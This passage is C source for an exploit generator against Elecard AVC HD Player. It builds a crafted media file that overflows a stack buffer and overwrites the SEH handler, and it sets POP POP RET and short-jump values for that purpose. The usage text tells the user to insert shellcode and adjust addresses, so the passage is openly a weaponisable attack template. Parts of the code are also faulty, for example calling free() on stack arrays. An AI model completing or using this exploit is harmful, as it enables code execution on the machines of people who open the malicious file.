0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x2E, 0x6D, 0x70, 0x33, 0x0D, 0x0A, 
  } ;

typedef struct FiLeDef {
         
  // Length: 14911 / 0x00003A3F (bytes)
  uint8_t Space [14911];
  //uint8_t  ReP [7];
  //uint8_t D [8];
       
         
} file_L;
         
typedef struct  {
          
  uint8_t *Name; 
  uint8_t *InstR;
        
  DWORD DreG;
  DWORD DLength;
           
} SET;
          

SET RunSploit [] = {
            
  {  "SEH OVERWRITE" , "POP POP RET" , 0xFFFFFFFF },    
         
  {  "NEXT SEH OVERWRITE", "JMP 4 BYTES" , 0xEB049090 },
         
  { NULL , NULL, NULL, NULL }
            
};
            
int main ( int8_t argc , uint8_t *argv [] )
  
{  
  file_L filN_L;
  uint8_t MEMHold [ALLOCSIZE];
  char NM [100];
  char MeM [ALLOCSIZE]; 
    
  if ( argc < 2) 
    fprintf ( stdout, "Usage is %s file\n", argv [0] );
  fprintf ( stdout ,"\tELECARD AVC HD PLAYER STACK BUFFER OVERFLOW ( SEH OVERWRITE )\n");
  fprintf ( stdout, "\tJust add shellcode and modify the addresess from RUNSPLOIT STRUCTURE and add shellcode\n");
  fprintf ( stdout , "\tCREDITS: fl0 fl0w\n");
  int8_t OFFSET = 0;
  int8_t count  = 0;
    

    
  strcpy (NM , argv [1] );
          
  strcat ( NM , ".xpl" );
        
  FILE *f;
     
  f = fopen ( NM , "wb" ); 
     
  assert ( f != NULL );
     
  OFFSET = SEH;
     
  strncpy ( Header + OFFSET , &RunSploit [0].DreG, sizeof ( RunSploit [0].DreG ) ); OFFSET = 0; OFFSET = NEXT_SEH;     
     
  strncpy ( Header + OFFSET , &RunSploit [1].DreG, sizeof ( RunSploit [1].DreG ) ); 
     
  strncpy ( &filN_L.Space , Header , sizeof (Header) );
     
  fwrite ( &filN_L , sizeof ( filN_L ) , 1, f );
      
  free ( MeM ); free ( NM );
     
  fclose ( f );
     
     
     
  getchar ( );                            
  return 0;    
}        
//EOF 


